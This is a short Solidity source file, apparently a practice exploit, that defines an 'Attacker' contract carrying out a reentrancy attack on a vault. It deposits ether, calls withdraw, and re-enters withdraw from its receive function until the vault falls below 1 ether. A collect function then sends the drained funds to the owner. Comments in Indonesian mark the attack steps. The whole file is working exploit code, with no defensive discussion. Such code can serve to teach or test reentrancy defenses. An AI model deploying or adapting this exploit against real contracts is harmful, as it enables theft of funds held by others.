// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Attacker {
    IVault public vault;
    address public owner;
    uint256 public count;

    constructor(address _vault) {
        vault = IVault(_vault);
        owner = msg.sender;
    }
    // mulai percobaan attack
    function attack() external payable {
        require(msg.value >= 1 ether);
        vault.deposit{value: msg.value}();
        vault.withdraw(1 ether); // trigger pertama
    }

   receive() external payable {
        if (address(vault).balance >= 1 ether)  {
            vault.withdraw(1 ether); // ambil kecil, ulangi
        }
    }

    function collect() external {
        require(msg.sender == owner, "Not owner");
        (bool success, ) = payable(owner).call{value: address(this).balance}(
            ""
        );
        require(success, "Transfer failed");
    }
}
